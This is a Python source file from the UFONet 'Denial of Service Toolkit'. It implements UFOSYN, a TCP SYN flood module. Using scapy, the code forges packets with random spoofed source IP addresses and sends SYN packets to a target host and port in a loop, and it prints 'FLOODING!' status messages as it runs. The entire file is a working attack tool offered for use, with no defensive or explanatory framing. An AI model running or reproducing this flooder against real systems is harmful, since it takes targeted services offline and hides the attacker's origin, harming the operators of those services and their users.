#!/usr/bin/env python 
# -*- coding: utf-8 -*-"
"""
UFONet - Denial of Service Toolkit - 2018 - by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import random, socket, os, sys
from scapy.all import *

# UFONet TCP SYN Flooder (UFOSYN)
def randIP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip

def randInt():
	x = random.randint(1,65535) # TCP ports
	return x	

def synize(ip, port, rounds):
    n=0
    for x in range (0,int(rounds)):
        n=n+1
        sport = randInt()
        seq = randInt()
        window = randInt()
        IP_p = IP()
        IP_p.src = randIP()
        try:
            IP_p.dst = ip
        except:
            print "[Error] UFOSYN: Failed to engage with 'quantum hook' ["+str(n)+"]"
            break
        TCP_l = TCP()	
        TCP_l.sport = sport
        TCP_l.dport = port
        TCP_l.flags = "S"
        TCP_l.seq = seq
	TCP_l.window = window
        try:
            send(IP_p/TCP_l, verbose=0)
            print "[Info] UFOSYN: Firing 'quantum hook' ["+str(n)+"] -> Status: FLOODING!"
        except:
            print "[Error] UFOSYN: Failed to engage with 'quantum hook' ["+str(n)+"]"

class UFOSYN(object):
    def attacking(self, target, rounds):
        print "[Info] TCP SYN Flooder (UFOSYN) is ready to fire: [" , rounds, "quantum hooks ]\n"
        if target.startswith('http://'):
            target = target.replace('http://','')
            port = 80
        elif target.startswith('https://'):
            target = target.replace('https://','')
            port = 443
        try:
            ip = socket.gethostbyname(target)
        except:
            ip = target
        synize(ip, port, rounds) # attack with UFOSYN using threading
